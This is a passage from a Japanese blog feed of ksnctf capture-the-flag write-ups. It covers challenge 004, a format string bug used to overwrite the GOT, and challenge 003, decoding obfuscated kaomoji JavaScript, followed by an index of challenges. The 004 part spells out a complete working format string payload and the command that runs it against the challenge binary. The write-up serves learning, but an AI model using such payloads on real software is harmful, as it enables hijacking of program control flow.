+<p>　以上の結果から、今回書き換える対象となる GOT のメモリアドレスは <code class="language-plaintext highlighter-rouge">0x80499f4</code> で間違いない。</p>
+
+<p>　書き換えることで、<code class="language-plaintext highlighter-rouge">puts</code> 関数を呼び出した時に<strong>任意のアドレスにジャンプ</strong>させることが出来る。</p>
+
+<h3 id="下準備2-ジャンプ先アドレス">下準備2 ジャンプ先アドレス</h3>
+
+<p>　ジャンプ先であるが、</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 8048681:       8b 84 24 18 04 00 00    mov    0x418<span class="o">(</span>%esp<span class="o">)</span>,%eax     <span class="c"># FLAG: # if(canFlag == 1)</span>
+ 8048688:       85 c0                   <span class="nb">test</span>   %eax,%eax                    <span class="c">#   ↓ canFlag(0x418) は 1 に初期化されている</span>
+ 804868a:       0f 95 c0                setne  %al                          <span class="c">#   ↓ 従って必ず式の結果は true</span>
+ 804868d:       84 c0                   <span class="nb">test</span>   %al,%al                      <span class="c">#   ↓ goto LOOP の処理を避けることは出来ない</span>
+ 804868f:       75 89                   jne    804861a &lt;main+0x66&gt;          <span class="c"># goto LOOP</span>
+                                                                            <span class="c"># ↓↓↓↓ flag.txt を読み込んで表示する処理 ↓↓↓↓</span>
+ 8048691:       c7 44 24 04 e6 87 04    movl   <span class="nv">$0x80487e6</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>         <span class="c">#   引数2 "flag.txt"</span>
+ 8048698:       08
+ 8048699:       c7 04 24 e8 87 04 08    movl   <span class="nv">$0x80487e8</span>,<span class="o">(</span>%esp<span class="o">)</span>            <span class="c">#   引数1 "r"</span>
+ 80486a0:       e8 ff fd ff ff          call   80484a4 &lt;fopen@plt&gt;          <span class="c"># fp = fopen("flag.txt", "r")</span>
+ 80486a5:       89 84 24 1c 04 00 00    mov    %eax,0x41c<span class="o">(</span>%esp<span class="o">)</span>
+ 80486ac:       8b 84 24 1c 04 00 00    mov    0x41c<span class="o">(</span>%esp<span class="o">)</span>,%eax             <span class="c">#   引数3 FILE* fp</span>
+ 80486b3:       89 44 24 08             mov    %eax,0x8<span class="o">(</span>%esp<span class="o">)</span>
+ 80486b7:       c7 44 24 04 00 04 00    movl   <span class="nv">$0x400</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>             <span class="c">#   引数2 0x400 = 1024</span>
+ 80486be:       00
+ 80486bf:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 80486c3:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80486c6:       e8 b9 fd ff ff          call   8048484 &lt;fgets@plt&gt;          <span class="c"># fgets(input, 1024, fp)</span>
+ 80486cb:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 80486cf:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80486d2:       e8 <span class="nb">dd </span>fd ff ff          call   80484b4 &lt;<span class="nb">printf</span>@plt&gt;         <span class="c"># printf(input)</span>
+ 80486d7:       b8 00 00 00 00          mov    <span class="nv">$0x0</span>,%eax
+                                                                            <span class="c"># ↑↑↑↑ ------------------------------- ↑↑↑↑</span>
+</code></pre></div></div>
+
+<p>　これの、</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 8048691:       c7 44 24 04 e6 87 04    movl   <span class="nv">$0x80487e6</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>         <span class="c">#   引数2 "flag.txt"</span>
+</code></pre></div></div>
+
+<p>　である。つまり、 <code class="language-plaintext highlighter-rouge">if(canFlag == 1)</code> を抜けた所( <code class="language-plaintext highlighter-rouge">0x08048691</code>アドレス )に飛ばすわけである。</p>
+
+<p>　これで、 <code class="language-plaintext highlighter-rouge">puts</code> 関数を呼び出したら、 <code class="language-plaintext highlighter-rouge">if(canFlag == 1)</code> を抜けたところに飛ぶという風に挙動を変えることが出来る。</p>
+
+<p>　※セキュリティ <code class="language-plaintext highlighter-rouge">PIE</code> が無効であることも重要である。コード領域がランダム化されていないからこそ、ジャンプ先のアドレスを狙い撃ち出来る。</p>
+
+<h3 id="下準備3-書き換え内容の計算">下準備3 書き換え内容の計算</h3>
+
+<p>　<code class="language-plaintext highlighter-rouge">0x80499f4</code> アドレス(<code class="language-plaintext highlighter-rouge">puts</code>関数のGOTアドレス)に <code class="language-plaintext highlighter-rouge">08048691</code> (<code class="language-plaintext highlighter-rouge">if(canFlag == 1)</code> を抜けた所のアドレス)を書き込む。</p>
+
+<p>　即ち、</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>書き込み先アドレス</th>
+      <th>書き込み内容</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0x80499f4</td>
+      <td>91</td>
+    </tr>
+    <tr>
+      <td>0x80499f5</td>
+      <td>86</td>
+    </tr>
+    <tr>
+      <td>0x80499f6</td>
+      <td>04</td>
+    </tr>
+    <tr>
+      <td>0x80499f7</td>
+      <td>08</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>　と書き込む。<code class="language-plaintext highlighter-rouge">91</code> から書き込んでいるのはリトルエンディアンのためだ。後ろから読む方式だ。</p>
+
+<p>　書き込むために計算をする。</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>書き込み内容</th>
+      <th>計算</th>
+      <th>byte数</th>
+      <th>累積 byte数</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>\x08\x04\x99\xf4</td>
+      <td> </td>
+      <td>4</td>
+      <td>4</td>
+    </tr>
+    <tr>
+      <td>\x08\x04\x99\xf5</td>
+      <td> </td>
+      <td>4</td>
+      <td>8</td>
+    </tr>
+    <tr>
+      <td>\x08\x04\x99\xf6</td>
+      <td> </td>
+      <td>4</td>
+      <td>12</td>
+    </tr>
+    <tr>
+      <td>\x08\x04\x99\xf7</td>
+      <td> </td>
+      <td>4</td>
+      <td>16</td>
+    </tr>
+    <tr>
+      <td>%129c</td>
+      <td>145(0x91) - 16(0x10)</td>
+      <td>129(0x81)</td>
+      <td>145(0x91)</td>
+    </tr>
+    <tr>
+      <td>%6$hhn</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>%245c</td>
+      <td>134(0x86) - 145(0x91) + 256(0x100)</td>
+      <td>245(0xF5)</td>
+      <td>390(0x186)</td>
+    </tr>
+    <tr>
+      <td>%7$hhn</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>%126c</td>
+      <td>4(0x04) - 390(0x186) + 512(0x200)</td>
+      <td>126(0x7E)</td>
+      <td>516(0x204)</td>
+    </tr>
+    <tr>
+      <td>%8$hhn</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>%4c</td>
+      <td>8(0x08) - 516(0x204) + 512(0x200)</td>
+      <td>4(0x04)</td>
+      <td>520(0x208)</td>
+    </tr>
+    <tr>
+      <td>%9$hhn</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<p>　書き込みたいアドレスを文頭に配置する。今回は4つ。その後ろに実際に書き込む値を指定する。今回は 1byte ずつ書き込むことにするので <code class="language-plaintext highlighter-rouge">%hhn</code> の書式トークンを利用する。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">%6$hnn</code> は6番目のメモリが指すアドレスに書き込む事を示す。（ <code class="language-plaintext highlighter-rouge">%x</code> の6番目に <code class="language-plaintext highlighter-rouge">41414141</code> と並んでいたのを思い出して欲しい。今はここに <code class="language-plaintext highlighter-rouge">\x08\x04\x99\xf4</code> 即ち、<code class="language-plaintext highlighter-rouge">080499f4</code> と並んでいることになる）</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">%129c</code> は <code class="language-plaintext highlighter-rouge">91</code> という値を示す。累積 byte数を書き込むため、表で言えば、 <code class="language-plaintext highlighter-rouge">129(0x81)</code> を指定することで <code class="language-plaintext highlighter-rouge">145(0x91)</code> 即ち <code class="language-plaintext highlighter-rouge">91</code> を書き込む。</p>
+
+<p>　下2つを書き込む仕様のため、 <code class="language-plaintext highlighter-rouge">%245c</code> と指定した時の累積バイト数が <code class="language-plaintext highlighter-rouge">390(0x186)</code> のため <code class="language-plaintext highlighter-rouge">86</code> を書き込む。</p>
+
+<p>　同様に、 <code class="language-plaintext highlighter-rouge">$126c</code>, <code class="language-plaintext highlighter-rouge">%4c</code> はそれぞれ <code class="language-plaintext highlighter-rouge">516(0x204)</code>, <code class="language-plaintext highlighter-rouge">520(0x208)</code> であり <code class="language-plaintext highlighter-rouge">04</code>, <code class="language-plaintext highlighter-rouge">08</code> を書き込む。</p>
+
+<p>　計算方法は、<code class="language-plaintext highlighter-rouge">書き込みたい文字 - 累積バイト数</code> である。負の値にならないように必要に応じて <code class="language-plaintext highlighter-rouge">512(0x200)</code> を加算する。<code class="language-plaintext highlighter-rouge">0x08</code>, <code class="language-plaintext highlighter-rouge">0x108</code>, <code class="language-plaintext highlighter-rouge">0x208</code> は全て <code class="language-plaintext highlighter-rouge">08</code> を書き込む仕様のため、負にならないように繰り上げれば問題ない。</p>
+
+<p>　長かったがこれで書き込む文字列が完成した。以下だ。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">\xf4\x99\x04\x08\xf5\x99\x04\x08\xf6\x99\x04\x08\xf7\x99\x04\x08%129c%6$hhn%245c%7$hhn%126c%8$hhn%4c%9$hhn</code></p>
+
+<p>　見やすさのために分けると、以下のように分けられる。</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">\xf4\x99\x04\x08</code></li>
+  <li><code class="language-plaintext highlighter-rouge">\xf5\x99\x04\x08</code></li>
+  <li><code class="language-plaintext highlighter-rouge">\xf6\x99\x04\x08</code></li>
+  <li><code class="language-plaintext highlighter-rouge">\xf7\x99\x04\x08</code></li>
+  <li><code class="language-plaintext highlighter-rouge">%129c%6$hhn</code></li>
+  <li><code class="language-plaintext highlighter-rouge">%245c%7$hhn</code></li>
+  <li><code class="language-plaintext highlighter-rouge">%126c%8$hhn</code></li>
+  <li><code class="language-plaintext highlighter-rouge">%4c%9$hhn</code></li>
+</ul>
+
+<h3 id="謎を解く">謎を解く</h3>
+
+<p>　後は、実際に入力してみればいい。コマンドラインから入力する形式で示す。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-en</span> <span class="s1">'\xf4\x99\x04\x08\xf5\x99\x04\x08\xf6\x99\x04\x08\xf7\x99\x04\x08%129c%6$hhn%245c%7$hhn%126c%8$hhn%4c%9$hhn'</span> | ./q4
+</code></pre></div></div>
+
+<p>　無事に Flag を獲得した。いやはや長かった。　</p>
+
+<h2 id="所感">所感</h2>
+<p>　pwn をちゃんと解いたのは今回が初めてである。</p>
+
+<p>　同僚からの話で雰囲気・用語・コマンドについていくつか聞いたことがあったが、いざ解こうと思った時には分からないことばかりであった。</p>
+
+<p>　結局、セキュリティ・脆弱性についていろいろ調べることになった。</p>
+
+<p>　おかげで少しは詳しくなったし、 pwn の面白さも分かったと言える。</p>
+
+<p>　本当は、 ksnctf の write-up を書くつもりはなかった。だが、この 004 番に取り組む中で、 write-up を書き残したくなったのだ。</p>
+
+<ul>
+  <li>分かったことを言語化すること</li>
+  <li>どのように解いたかをいつでも振り替えられる状態にしておくこと</li>
+</ul>
+
+<p>　この2点を満たしたいがために、 write-up を書くと決めた。</p>
+
+<p>　誰が見ても分かる write-up というよりは、自分で見たら思いだせる write-up という傾向の方が強くなっているかもしれない。</p>
+
+<p>　ただ、見返してみると自分でも分かりづらい記事に感じる。これは記事の構成が悪いのだとは思う。気が向いたら直すかもしれない。</p>
+
+<p>　およそ2週間ほどこの問題と戦ったが、とても勉強になった。</p>
+
+<p>　初めは逆アセンブルしても <code class="language-plaintext highlighter-rouge">FSB</code> に気づけなかった。それで脆弱性の種類を調べる必要に迫られた。また、セキュリティの状態によって使える攻撃手法や書き込める領域が異なるようで、脆弱性だけでなくセキュリティについての知識も十分に求められていることに気づいた。</p>
+
+<p>　しばらくして、久しぶりに逆アセンブルした結果を見ると、いとも簡単に <code class="language-plaintext highlighter-rouge">FSB</code> に気づけた。セキュリティチェックもすると、<code class="language-plaintext highlighter-rouge">GOT overwrite</code> の可能性も浮上した。</p>
+
+<p>　そこからは <code class="language-plaintext highlighter-rouge">%hhn</code> の使い方の部分で案外苦労した。攻撃計画を立案出来ても、実際の攻撃コードを組み立てるのも難しさがあった。</p>
+
+<p>　フラグを取るまで長かったが、全てが一本の線で綺麗にまとまっている気がしてとても清々しい気分だ。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">ksnctf 004</code> を解けたことで、私のCTFはようやく始まったのだと言える。</p>
+
+<p>　ありがとう <code class="language-plaintext highlighter-rouge">CTF</code></p>
+
+<p>　ありがとう <code class="language-plaintext highlighter-rouge">kasnctf</code></p>
+
+<p>　
+　</p>]]></content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">ksnctf 003 Crawling Chaos</title><link href="/contents/tech/ctf_ksnctf/2021/05/18/003.html" rel="alternate" type="text/html" title="ksnctf 003 Crawling Chaos" /><published>2021-05-18T12:38:04+00:00</published><updated>2021-05-18T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/18/003</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/18/003.html"><![CDATA[<h2 id="ksnctf-003-crawling-chaos">ksnctf 003 Crawling Chaos</h2>
+<ul>
+  <li>問題公開日: 2012/05/24</li>
+  <li>ジャンル: web</li>
+</ul>
+
+<h3 id="謎解き">謎解き</h3>
+
+<p>　正しい入力をすればFLAGを取得できそうな入力フォームがある。</p>
+
+<p>　F12 を押して devloper tools を開いてソースコードを見てみると、目を疑う光景が広がっていた。</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+    <span class="p">(</span><span class="nx">ᒧᆞωᆞ</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="sr">/ᆞωᆞ/</span><span class="p">),(</span><span class="nx">ᒧᆞωᆞ</span><span class="p">).</span><span class="nx">ᒧうー</span><span class="o">=-!!</span><span class="p">(</span><span class="sr">/ᆞωᆞ/</span><span class="p">).</span><span class="nx">にゃー</span><span class="p">,(</span><span class="nx">〳ᆞωᆞ</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="nx">ᒧᆞωᆞ</span><span class="p">),....</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>　入力フォームの挙動は javascript で書かれているはずであり、つまりは <code class="language-plaintext highlighter-rouge">&lt;script&gt;&lt;/script&gt;</code> にあるはずなのだが、そこには愉快な顔文字が並んでいるだけであった。</p>
+
+<p>　どうして動いているのかさっぱり分からないが、ともかくこれらが javascript と同等の働きをしていると考えないとサイトの挙動を説明できない。取っ掛かりの見当すらつかないのだが、これを解読するのが今回の問題と考えられる。</p>
+
+<p>　カンマ区切りで改行してみると、幾分見やすくなった。</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+    <span class="p">(</span><span class="nx">ᒧᆞωᆞ</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="sr">/ᆞωᆞ/</span><span class="p">),</span>
+    <span class="p">(</span><span class="nx">ᒧᆞωᆞ</span><span class="p">).</span><span class="nx">ᒧうー</span><span class="o">=-!!</span><span class="p">(</span><span class="sr">/ᆞωᆞ/</span><span class="p">).</span><span class="nx">にゃー</span><span class="p">,</span>
+    <span class="p">(</span><span class="nx">〳ᆞωᆞ</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="nx">ᒧᆞωᆞ</span><span class="p">),</span>
+    <span class="p">(</span><span class="nx">〳ᆞωᆞ</span><span class="p">).</span><span class="nx">〳にゃー</span><span class="o">=-</span> <span class="o">-!</span><span class="p">(</span><span class="nx">ᒧᆞωᆞ</span><span class="p">).</span><span class="nx">ᒧうー</span><span class="p">,</span>
+    <span class="p">...</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>　<code class="language-plaintext highlighter-rouge">=</code> を使っているわけだから、左辺に右辺を代入しているのだろう。</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">(ᒧᆞωᆞ) = (/ᆞωᆞ/)</code></li>
+  <li><code class="language-plaintext highlighter-rouge">hoge = 10</code></li>
+</ul>
+
+<p>　みたいな関係があると想像してみる。そこでもしやと思った。</p>
+
+<p>　仮に<code class="language-plaintext highlighter-rouge">(ᒧᆞωᆞ)</code>が変数なのであれば、 <code class="language-plaintext highlighter-rouge">console.log</code> で値を確認出来るのではないか、と。</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+    <span class="p">(</span><span class="nx">ᒧᆞωᆞ</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="sr">/ᆞωᆞ/</span><span class="p">),</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">((</span><span class="nx">ᒧᆞωᆞ</span><span class="p">)),</span>
+    <span class="p">(</span><span class="nx">ᒧᆞωᆞ</span><span class="p">).</span><span class="nx">ᒧうー</span><span class="o">=-!!</span><span class="p">(</span><span class="sr">/ᆞωᆞ/</span><span class="p">).</span><span class="nx">にゃー</span><span class="p">,</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">((</span><span class="nx">ᒧᆞωᆞ</span><span class="p">).</span><span class="nx">ᒧうー</span><span class="p">),</span>
+    <span class="p">(</span><span class="nx">〳ᆞωᆞ</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="nx">ᒧᆞωᆞ</span><span class="p">),</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">((</span><span class="nx">〳ᆞωᆞ</span><span class="p">)),</span>
+    <span class="p">(</span><span class="nx">〳ᆞωᆞ</span><span class="p">).</span><span class="nx">〳にゃー</span><span class="o">=-</span> <span class="o">-!</span><span class="p">(</span><span class="nx">ᒧᆞωᆞ</span><span class="p">).</span><span class="nx">ᒧうー</span><span class="p">,</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">((</span><span class="nx">〳ᆞωᆞ</span><span class="p">).</span><span class="nx">〳にゃー</span><span class="p">),</span>
+    <span class="p">...</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>　入れてみるとなんだかバカなことをやっているんじゃないかと思えてきたのだが、なんと正解だったのだからもうどうにでもなれである。</p>
+
+<p>　出力結果は以下である。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="nx">ᆞωᆞ</span><span class="o">/</span>
+<span class="o">-</span><span class="mi">0</span>
+<span class="o">/</span><span class="nx">ᆞωᆞ</span><span class="o">/</span>
+<span class="mi">1</span>
+<span class="p">...</span>
+</code></pre></div></div>
+
+<p>　console.log が効いたので、変数という事で良さそうだ。というわけで片っ端から console.log で出力してみたところ、現れた。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">(ᒧᆞωᆞ).ᒧうーｰｰｰー</code> の中身は以下の <code class="language-plaintext highlighter-rouge">javascript</code> であった。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">form</span><span class="dl">"</span><span class="p">).</span><span class="nx">submit</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+        <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">input[type="text"]</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
+        <span class="kd">var</span> <span class="nx">p</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">70</span><span class="p">,</span><span class="mi">152</span><span class="p">,</span><span class="mi">195</span><span class="p">,</span><span class="mi">284</span><span class="p">,</span><span class="mi">475</span><span class="p">,</span><span class="mi">612</span><span class="p">,</span><span class="mi">791</span><span class="p">,</span><span class="mi">896</span><span class="p">,</span><span class="mi">810</span><span class="p">,</span><span class="mi">850</span><span class="p">,</span><span class="mi">737</span><span class="p">,</span><span class="mi">1332</span><span class="p">,</span><span class="mi">1469</span><span class="p">,</span><span class="mi">1120</span><span class="p">,</span><span class="mi">1470</span><span class="p">,</span><span class="mi">832</span><span class="p">,</span><span class="mi">1785</span><span class="p">,</span><span class="mi">2196</span><span class="p">,</span><span class="mi">1520</span><span class="p">,</span><span class="mi">1480</span><span class="p">,</span><span class="mi">1449</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="nx">t</span><span class="p">.</span><span class="nx">length</span><span class="p">){</span>
+            <span class="nx">f</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">p</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="k">if</span><span class="p">(</span> <span class="nx">t</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">p</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span> <span class="nx">f</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+            <span class="k">if</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span> <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">(」・ω・)」うー!(/・ω・)/にゃー!</span><span class="dl">"</span><span class="p">);</span>
+        <span class="p">}</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f</span><span class="p">)</span> <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">No</span><span class="dl">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>　良く良く見れば、<code class="language-plaintext highlighter-rouge">&lt;head&gt;&lt;/head&gt;</code> で JQuery を読み込んでいたわけで、ちゃんと使っていたわけである。ここまで来てもいろいろ信じられないことが多いのだが、とにかくここまで来た。</p>
+
+<p>　フォームを押した時の挙動が記されており、配列pから生成した値と入力値が全文字で一致したら<code class="language-plaintext highlighter-rouge">うーにゃー</code>のアラートを出してくれるらしい。</p>
+
+<p>　おそらく、その入力値がフラグなのだろう。</p>
+
+<p>　これでやることが明確になった。</p>
+
+<h3 id="解く">解く</h3>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">p</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="k">if</span><span class="p">(</span> <span class="nx">t</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">p</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span> <span class="nx">f</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>　入力した文字を一文字ずつ(t)に対して、 <code class="language-plaintext highlighter-rouge">t.charCodeAt(i)*(i+1)</code> の計算をした値が <code class="language-plaintext highlighter-rouge">p[i]</code> と一致すれば良い。</p>
+
+<p>　従って、以下のように変形していける。</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">t.charCodeAt(i)*(i+1) == p[i]</code> : 両辺を (i+1) で割る ↓</li>
+  <li><code class="language-plaintext highlighter-rouge">t.charCodeAt(i) == p[i] / (i+1)</code> : 両辺を charCode で割る（？）的な ↓</li>
+  <li><code class="language-plaintext highlighter-rouge">t = String.fromCharCode(p[i] / (i+1))</code> : 完成。</li>
+</ul>
+
+<p>　即ち、p配列の要素全てに上記の計算を行った値を出力すれば謎が解けるはずである。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">p</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">70</span><span class="p">,</span><span class="mi">152</span><span class="p">,</span><span class="mi">195</span><span class="p">,</span><span class="mi">284</span><span class="p">,</span><span class="mi">475</span><span class="p">,</span><span class="mi">612</span><span class="p">,</span><span class="mi">791</span><span class="p">,</span><span class="mi">896</span><span class="p">,</span><span class="mi">810</span><span class="p">,</span><span class="mi">850</span><span class="p">,</span><span class="mi">737</span><span class="p">,</span><span class="mi">1332</span><span class="p">,</span><span class="mi">1469</span><span class="p">,</span><span class="mi">1120</span><span class="p">,</span><span class="mi">1470</span><span class="p">,</span><span class="mi">832</span><span class="p">,</span><span class="mi">1785</span><span class="p">,</span><span class="mi">2196</span><span class="p">,</span><span class="mi">1520</span><span class="p">,</span><span class="mi">1480</span><span class="p">,</span><span class="mi">1449</span><span class="p">);</span>
+<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">p</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span> <span class="s2">`? = </span><span class="p">${</span><span class="nx">p</span><span class="p">[</span><span class="nx">i</span><span class="p">]}</span><span class="s2"> / </span><span class="p">${(</span><span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)}</span><span class="s2"> = </span><span class="p">${</span><span class="nx">p</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">/</span> <span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)}</span><span class="s2"> : </span><span class="p">${</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">p</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">/</span> <span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">))}</span><span class="s2">`</span> <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>　出力結果は想定通りの結果だった。FLAGが出てきて、クリア。</p>
+
+<h2 id="所感">所感</h2>
+
+<p>　謎は解けたが、うーにゃーで <code class="language-plaintext highlighter-rouge">javascript</code> と同等の機能になっているという謎は未だ分かっていない。調べようにも調べ方が分からない。</p>
+
+<p>　この問題に含まれていた謎は、二つだろう。</p>
+
+<ul>
+  <li>うーにゃーがjavascriptと同等の機能を実現していること</li>
+  <li>逆算の仕方</li>
+</ul>
+
+<p>　2つ目は数式の変換だけでありそれほど苦ではなかったが、1つ目は一種の閃きに助けられた。</p>
+
+<p>　規則性を見出す点は crypto に近かったから、web問らしさはないのかもしれない。</p>
+
+<p>　web問というのはネットワークパケットを解析したりするのだろうか、さてわからない。</p>
+
+<p>　ともかくこれで2問目だ。実質3問目ということで良いか。</p>
+
+<p>　うーにゃーの謎を残したが、先へ進もうと思う。</p>
+
+<p>　FLAGを取る感覚が随分と分かってきた気がする。この調子で次もぱぱっと解いてしまおう。いざ。</p>]]></content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">目次(ネタバレ含む)</title><link href="/contents/tech/ctf_ksnctf/2021/05/18/index.html" rel="alternate" type="text/html" title="目次(ネタバレ含む)" /><published>2021-05-18T12:38:04+00:00</published><updated>2021-05-18T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/18/index</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/18/index.html"><![CDATA[<table>
+  <thead>
+    <tr>
+      <th>No</th>
+      <th>Title</th>
+      <th>ジャンル</th>
+      <th>解法</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>001</td>
+      <td>Test Problem</td>
+      <td>-</td>
+      <td>-</td>
+    </tr>
+    <tr>
+      <td>002</td>
+      <td>Easy Cipher</td>
+      <td>crypto</td>
+      <td>ROT13</td>
+    </tr>
+    <tr>
+      <td>003</td>
+      <td>Crawling Chaos</td>
+      <td>web</td>
+      <td>解読？</td>
+    </tr>
+    <tr>
+      <td>004</td>
+      <td>Villager A</td>
+      <td>pwn</td>
+      <td>Format String Bug を利用した GOT overwrite</td>
+    </tr>
+    <tr>
+      <td>005</td>
+      <td>Onion</td>
+      <td>crypto</td>
+      <td>Base64, uuencode</td>
+    </tr>
+    <tr>
+      <td>006</td>
+      <td>Login</td>
